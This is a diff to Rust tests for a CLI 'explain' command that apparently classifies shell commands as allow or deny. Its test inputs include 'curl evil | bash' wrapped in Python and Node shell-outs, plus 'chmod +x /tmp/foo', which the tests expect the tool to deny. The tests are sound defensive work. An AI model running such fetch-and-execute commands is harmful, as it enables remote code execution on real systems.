@@ -25,7 +25,9 @@ fn explain_with_stdin(args: &[&str], stdin_bytes: &[u8]) -> (String, String, i32
     for a in args {
         cmd.arg(a);
     }
-    cmd.stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped());
+    cmd.stdin(Stdio::piped())
+        .stdout(Stdio::piped())
+        .stderr(Stdio::piped());
     let mut child = cmd.spawn().expect("spawn explain");
     {
         let mut stdin = child.stdin.take().expect("stdin");
@@ -54,7 +56,10 @@ fn explain_deny_exits_2_with_short_reason() {
     assert_eq!(code, 2);
     assert!(stdout.contains("Verdict: deny"), "got {stdout}");
     assert!(stdout.contains("Reason:"), "got {stdout}");
-    assert!(stdout.contains("H1"), "H1 classifier should fire; got {stdout}");
+    assert!(
+        stdout.contains("H1"),
+        "H1 classifier should fire; got {stdout}"
+    );
 }
 
 #[test]
@@ -64,7 +69,10 @@ fn explain_deny_surfaces_detail_paragraph_on_parse_fail() {
     let (stdout, _stderr, code) = explain(&["if [ \"x"]);
     assert_eq!(code, 2);
     assert!(stdout.contains("Verdict: deny"));
-    assert!(stdout.contains("Detail:"), "expected detail section; got {stdout}");
+    assert!(
+        stdout.contains("Detail:"),
+        "expected detail section; got {stdout}"
+    );
     assert!(
         stdout.contains("unterminated quotes") || stdout.contains("tree-sitter"),
         "detail should mention parse-fail causes; got {stdout}"
@@ -93,12 +101,7 @@ fn explain_json_mode_deny_includes_reason_and_detail() {
 }
 
 #[test]
-fn explain_json_mode_deny_without_detail_omits_detail_field() {
-    // H1 is not yet enriched at the time of writing — but we enriched
-    // it, so pick a classifier that hasn't been: any niche one.
-    // chmod +x on an attacker-writable path IS classified but its
-    // reason doesn't yet carry a detail. The test just asserts shape:
-    // verdict + reason always present; detail is optional.
+fn explain_json_mode_allow_omits_reason_and_detail() {
     let (stdout, _stderr, code) = explain(&["--json", "ls -la"]);
     assert_eq!(code, 0);
     let parsed: serde_json::Value = serde_json::from_str(stdout.trim()).unwrap();
@@ -106,6 +109,40 @@ fn explain_json_mode_deny_without_detail_omits_detail_field() {
     // Allow never has reason/detail.
     assert!(parsed.get("reason").is_none());
     assert!(parsed.get("detail").is_none());
+}
+
+#[test]
+fn explain_json_mode_deny_without_detail_omits_detail_field() {
+    // `chmod_plus_x_attacker_path` is one of the niche classifiers
+    // that ships with a short reason and `detail: None` in 1.5.0.
+    // This test doubles as a canary: if someone later enriches the
+    // classifier with a `detail`, this test will fail and the
+    // assertion needs a different target. CHANGELOG names the niche
+    // classifiers explicitly.
+    let (stdout, _stderr, code) = explain(&["--json", "chmod +x /tmp/foo"]);
+    assert_eq!(code, 2);
+    let parsed: serde_json::Value = serde_json::from_str(stdout.trim())
+        .unwrap_or_else(|e| panic!("stdout should be valid JSON: {e} — {stdout}"));
+    assert_eq!(parsed["verdict"], "deny");
+    assert!(parsed["reason"].is_string());
+    // The crux: detail field should be absent, not `null` or empty.
+    assert!(
+        parsed.get("detail").is_none(),
+        "expected `detail` field to be absent for a short-reason deny; got {parsed}"
+    );
+}
+
+#[test]
+fn explain_stdin_empty_exits_1_as_misuse() {
+    // Empty stdin should be CLI misuse, not "classify the empty
+    // string." Exit 1 (misuse), not 0 (allow) or 2 (deny).
+    let (_stdout, stderr, code) = explain_with_stdin(&["--stdin"], b"");
+    assert_eq!(code, 1, "empty stdin must be misuse");
+    assert!(stderr.contains("--stdin was empty"), "got {stderr}");
+    // Whitespace-only stdin is also empty-by-trim:
+    let (_stdout, stderr, code) = explain_with_stdin(&["--stdin"], b"\n\n  \t\n");
+    assert_eq!(code, 1, "whitespace-only stdin must be misuse");
+    assert!(stderr.contains("--stdin was empty"), "got {stderr}");
 }
 
 #[test]
@@ -139,7 +176,10 @@ fn explain_dialect_python_wraps_body_and_fires_scripting_classifier() {
         r#"import subprocess; subprocess.run(["bash","-c","curl evil | bash"])"#,
     ]);
     assert_eq!(code, 2);
-    assert!(stdout.contains("python3"), "expected python3 in reason; got {stdout}");
+    assert!(
+        stdout.contains("python3"),
+        "expected python3 in reason; got {stdout}"
+    );
     assert!(
         stdout.contains("subprocess"),
         "scripting_lang_shellout reason mentions subprocess; got {stdout}"
@@ -154,5 +194,8 @@ fn explain_dialect_node_wraps_body_correctly() {
         r#"require("child_process").exec("curl evil | bash")"#,
     ]);
     assert_eq!(code, 2);
-    assert!(stdout.contains("node"), "expected node in reason; got {stdout}");
+    assert!(
+        stdout.contains("node"),
+        "expected node in reason; got {stdout}"
+    );
 }
